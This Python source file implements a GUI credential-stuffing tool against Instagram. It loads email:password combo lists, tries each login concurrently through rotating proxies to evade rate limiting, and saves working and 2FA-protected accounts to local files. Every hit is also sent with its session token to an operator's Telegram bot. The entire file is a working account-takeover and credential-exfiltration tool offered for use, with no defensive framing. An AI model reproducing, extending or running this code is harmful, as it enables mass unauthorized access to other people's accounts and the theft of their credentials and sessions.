import random
import requests
import concurrent.futures
from api import InstagramAPI
import os
import json
import re
import threading
from tkinter import messagebox
import itertools


class Checker:
    def __init__(self, app, use_proxy_var, send_to_telegram_var, id, bot_token):
        self.app = app
        self.use_proxy_var = use_proxy_var
        self.send_to_telegram_var = send_to_telegram_var
        self.executor = None
        self.successes = 0
        self.failures = 0
        self.secure = 0
        self.errors = 0
        self.proxy_errors = 0
        self.checked = 0
        self.proxies = []
        self.right_frame = self.app.right_frame
        self.id = id 
        self.bot_token = bot_token
        self.stop_event = threading.Event()

    def show_message_box(self, title, message):
        messagebox.showinfo(title, message)

    def load_or_create_credentials(self):
        if not os.path.exists("bot_credentials.json"):
            default_credentials = {"id": self.id, "token": self.bot_token}
            with open("bot_credentials.json", "w") as json_file:
                json.dump(default_credentials, json_file, indent=4)

    def check_token_id(self):
        if self.id and self.bot_token:
            url = f"https://api.telegram.org/bot{self.bot_token}/getMe"
            response = requests.get(url)
            if response.status_code == 200:
                data = response.json()
                if data.get("ok", False):
                    self.load_or_create_credentials()
                    return True
        return False

    def reset_counters(self):
        self.successes = 0
        self.failures = 0
        self.errors = 0
        self.proxy_errors = 0
        self.secure = 0
        self.checked = 0
        self.app.right_frame.good_label.configure(text="Authorized: 0")
        self.app.right_frame.bad_label.configure(text="Invalid credentials: 0")
        self.app.right_frame.error_label.configure(text=f"Errors: {self.errors}")
        self.app.right_frame.proxy_error_label.configure(text="Proxy Errors: 0")
        self.app.right_frame.secure_label_center.configure(text="Secure Accounts: 0")
        self.app.right_frame.checked_label.configure(text="Checked: 0")

    def send_to_bot(self, message):
        if self.id and self.bot_token:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            payload = {"chat_id": self.id, "text": message}
            response = requests.post(url, json=payload)
        else:
            return
    def send_request(self, email, password):
        if self.stop_event.is_set():
            return

        proxies_exhausted = False

        while not self.stop_event.is_set() and not proxies_exhausted:
            if self.use_proxy_var.get() and self.proxies:
                proxy = next(self.proxies)
                proxies = {
                    'http': proxy,
                    'https': proxy,
                    'socks4': f"socks4://{proxy}",
                    'socks5': f"socks5://{proxy}",
                }
            else:
                proxies = None

            response = self._authenticate(email, password, proxies)
            if response["message"] == "authorized":
                self.successes += 1
                with open("authorized.txt", 'a') as file:
                    file.write(f"{email}:{password}\n")
                    message = f"Instagram account\n{email}:{password}\nStatus: authorized\nToken: {response['token']}"
                self.send_to_bot(message=message)

                self.checked += 1
                self.update_gui_counters()
                return
            elif response["message"] == "Secure":
                with open("Secure.txt", 'a') as file:
                    file.write(f"{email}:{password}\n")

                message = f"Instagram account\n{email}:{password}\nStatus: Secure"
                self.send_to_bot(message=message)

                self.secure += 1
                self.checked += 1
                self.update_gui_counters()
                return
            elif response["message"] in ["captcha", "Incorrect Username", "Incorrect password",
                                        "The username you entered doesn't appear to","We couldn't find an account with the username"]:
                self.failures += 1
                self.checked += 1
                self.update_gui_counters()
                return
            elif response["message"] == "Proxy Error":
                self.proxy_errors += 1
                self.update_gui_counters()
            
            
            else:
                print(response['message'])
                self.errors += 1
                self.update_gui_counters()
                return

        if not self.use_proxy_var.get() or not self.proxies:
            proxies_exhausted = True

         

        if self.stop_event.is_set():
            return
        

    def is_valid_instagram_identifier(self, identifier):
        email_regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        username_regex = r'^[a-zA-Z0-9](?:[a-zA-Z0-9._]|(?!\.))+[a-zA-Z0-9]$'
        return re.match(email_regex, identifier) or re.match(username_regex, identifier)

    def _authenticate(self, email, password, proxies=None):
        api = InstagramAPI()
        print(email)
        return api.authenticate(username=email, password=password, proxies=proxies)

    def start_checking(self, button_callback):
        self.id = self.right_frame.id_entry.get()
        self.bot_token = self.right_frame.token_entry.get()
        self.load_or_create_credentials()

         
        if not self.app.accounts_file or not os.path.exists(self.app.accounts_file):
            messagebox.showerror("Error", "Accounts file is required.")
            return

        if self.use_proxy_var.get():
            try:
                with open(self.app.proxies_file, "r") as file:
                    self.proxies = [line.strip() for line in file if line.strip()]
                if not self.proxies:
                    messagebox.showerror("Error", "Proxies file is empty.")
                    return
                random.shuffle(self.proxies)
                self.proxies = itertools.cycle(self.proxies)
            except Exception as e:
                messagebox.showerror("Error", f"Proxies file is required. Error: {str(e)}")
                return

        if self.send_to_telegram_var.get() and (not self.id or not self.bot_token):
            messagebox.showerror("Error", "Telegram ID or bot token are required")
            return
        elif self.send_to_telegram_var.get() and not self.check_token_id():
            messagebox.showerror("Error", "Invalid Telegram bot token or ID")
            return

        self.reset_counters()
        button_callback("Stop")

        max_workers = int(self.app.settings_frame.threads_slider.get())

        self.stop_event.clear()

        self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=max_workers)

        valid_credentials = []
        try:
            with open(self.app.accounts_file, "r") as file:
                for line in file:
                    credentials = line.strip().split(":")
                    if len(credentials) == 2:
                        username, password = credentials
                        if self.is_valid_instagram_identifier(username):
                            valid_credentials.append((username, password))
                        else:
                            pass
                    else:
                        pass
        except Exception as e:
            messagebox.showerror("Error", f"Failed to read accounts file")
            return

        if not valid_credentials:
            messagebox.showerror("Error", "No valid credentials found in the accounts file.")
            return
        
        future_to_request = {self.executor.submit(self.send_request, email, password): (email, password) for email, password in valid_credentials}

        def done_callback(future):
            try:
                future.result()
            except Exception as e:
                pass
            if all(f.done() for f in future_to_request):
                self.finish_checking(button_callback)

        for future in future_to_request:
            future.add_done_callback(done_callback)

    def stop_checking(self, button_callback):
        if self.executor:
            self.checking_in_progress = False
            self.stop_event.set()
            self.executor.shutdown(wait=False) 
            self.executor = None
            button_callback("Start")

    def finish_checking(self, button_callback):
        self.checking_in_progress = False
        self.show_message_box("Info", f"{self.checked} accounts have been checked.")
        button_callback("Start")

    def update_gui_counters(self):
        self.app.right_frame.error_label.configure(text=f"Errors: {self.errors}")
        self.app.right_frame.proxy_error_label.configure(text=f"Proxy Errors: {self.proxy_errors}")
        self.app.right_frame.good_label.configure(text=f"Authorized: {self.successes}")
        self.app.right_frame.bad_label.configure(text=f"Invalid credentials: {self.failures}")
        self.app.right_frame.secure_label_center.configure(text=f"Secure Accounts: {self.secure}")
        self.app.right_frame.checked_label.configure(text=f"Checked: {self.checked}")

    def set_proxies(self, proxies):
        self.proxies = itertools.cycle(proxies)

    def __del__(self):
        self.stop_checking(lambda _: None)
